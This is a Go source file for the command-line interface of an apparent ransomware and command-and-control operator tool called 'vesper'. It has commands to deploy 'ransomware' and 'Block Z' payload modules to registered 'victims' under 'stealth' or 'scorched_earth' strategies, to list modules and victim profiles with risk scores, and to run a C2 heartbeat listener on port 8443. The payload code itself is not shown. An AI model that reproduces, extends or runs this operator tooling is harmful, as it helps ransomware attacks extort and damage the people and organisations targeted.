package main

import (
	"fmt"
	"net"
	"strings"

	"github.com/spf13/cobra"
)

func init() {
	payloadCmd := &cobra.Command{
		Use:   "deploy [victim] [modules]",
		Short: "Deploy payload modules to target victim",
		Long:  "Deploy ransomware and Block Z modules to a victim by profile. Use comma-separated module names or 'all' for full deployment.",
		Example: `  vesper deploy victim01 ransomware/execute,blockz/genetic_evolve,z1
  vesper deploy victim02 all
  vesper deploy victim03 --listen-only
  vesper modules list
  vesper victims list`,
		Run: runDeploy,
	}

	payloadCmd.Flags().Bool("listen-only", false, "C2 listen-only mode: receive heartbeats, do not orchestrate attacks")
	payloadCmd.Flags().String("strategy", "stealth", "Deployment strategy: stealth, targeted, scorched_earth")
	rootCmd.AddCommand(payloadCmd)

	modulesCmd := &cobra.Command{
		Use:   "modules",
		Short: "List available payload modules",
	}
	modulesListCmd := &cobra.Command{
		Use:   "list",
		Short: "List modules by category",
		Run:   runModulesList,
	}
	modulesCmd.AddCommand(modulesListCmd)

	categoriesCmd := &cobra.Command{
		Use:   "categories",
		Short: "List module categories",
		Run:   runCategories,
	}
	modulesCmd.AddCommand(categoriesCmd)
	rootCmd.AddCommand(modulesCmd)

	victimsCmd := &cobra.Command{
		Use:   "victims",
		Short: "Manage victim profiles",
	}
	victimsListCmd := &cobra.Command{
		Use:   "list",
		Short: "List registered victims",
		Run:   runVictimsList,
	}
	victimsCmd.AddCommand(victimsListCmd)
	rootCmd.AddCommand(victimsCmd)

	c2Cmd := &cobra.Command{
		Use:   "c2",
		Short: "C2 server commands",
	}
	c2ListenCmd := &cobra.Command{
		Use:   "listen",
		Short: "Start C2 in listen-only mode",
		Run:   runC2Listen,
	}
	c2Cmd.AddCommand(c2ListenCmd)
	rootCmd.AddCommand(c2Cmd)
}

func runDeploy(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		fmt.Fprintln(ConsoleOut, "AppState not initialized")
		return
	}
	if len(args) < 1 {
		fmt.Fprintln(ConsoleOut, "Usage: vesper deploy <victim_id> [modules]")
		fmt.Fprintln(ConsoleOut, "  modules: comma-separated or 'all'")
		return
	}

	victimID := args[0]
	moduleFilter := "all"
	if len(args) >= 2 {
		moduleFilter = args[1]
	}

	listenOnly, _ := cmd.Flags().GetBool("listen-only")
	strategy, _ := cmd.Flags().GetString("strategy")

	dm := state.NewDeploymentManager()
	vp := dm.GetVictim(victimID)
	if vp == nil {
		vp = dm.RegisterVictim(victimID, "unknown", "0.0.0.0", []int{}, []string{})
	}
	dm.ProfileVictim(vp.ID)

	plan, err := dm.CreateDeploymentPlan(vp.ID, moduleFilter)
	if err != nil {
		fmt.Fprintf(ConsoleOut, "ERROR: %v\n", err)
		return
	}

	fmt.Fprintf(ConsoleOut, "DEPLOYMENT PLAN: Victim=%s Strategy=%s Modules=%v ListenOnly=%v\n",
		vp.Hostname, strategy, plan.Modules, listenOnly)

	if !listenOnly {
		results := dm.DeployPlan(plan)
		for mod, result := range results {
			status := "OK"
			if strings.Contains(result, "FAILED") {
				status = "FAIL"
			}
			fmt.Fprintf(ConsoleOut, "  %s -> %s\n", mod, status)
		}
	} else {
		fmt.Fprintln(ConsoleOut, "  [listen-only] Modules queued. C2 will relay but not execute.")
		for _, mod := range plan.Modules {
			fmt.Fprintf(ConsoleOut, "  queued: %s\n", mod)
		}
	}
}

func runModulesList(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	categories := dm.GetModuleCategories()
	for cat, mods := range categories {
		fmt.Fprintf(ConsoleOut, "[%s] %d modules:\n", cat, len(mods))
		for _, m := range mods {
			fmt.Fprintf(ConsoleOut, "  %s\n", m)
		}
	}
}

func runCategories(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	cats := dm.GetModuleCategories()
	fmt.Fprintln(ConsoleOut, "Module categories:")
	for cat, mods := range cats {
		fmt.Fprintf(ConsoleOut, "  %-20s : %d modules\n", cat, len(mods))
	}
}

func runVictimsList(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	dm := state.NewDeploymentManager()
	victims := dm.ListVictims()
	if len(victims) == 0 {
		fmt.Fprintln(ConsoleOut, "No victims registered.")
		return
	}
	for _, vp := range victims {
		fmt.Fprintf(ConsoleOut, "  %s | %s | risk=%.2f | %d modules\n",
			vp.ID, vp.Status, vp.RiskScore, len(vp.ActiveModules))
	}
}

func runC2Listen(cmd *cobra.Command, args []string) {
	state := GetOrCreateState()
	if state == nil {
		return
	}
	fmt.Fprintln(ConsoleOut, "C2 LISTEN-ONLY MODE - relaying heartbeats, not orchestrating")
	fmt.Fprintln(ConsoleOut, "C2 listener active. Press Ctrl+C to stop.")

	listener, err := net.Listen("tcp", ":8443")
	if err != nil {
		fmt.Fprintf(ConsoleOut, "  ERROR: %v\n", err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		fmt.Fprintf(ConsoleOut, "  [heartbeat] connection from %s\n", conn.RemoteAddr())
		conn.Write([]byte(`{"status":"ok","version":"3.2"}`))
		conn.Close()
	}
}
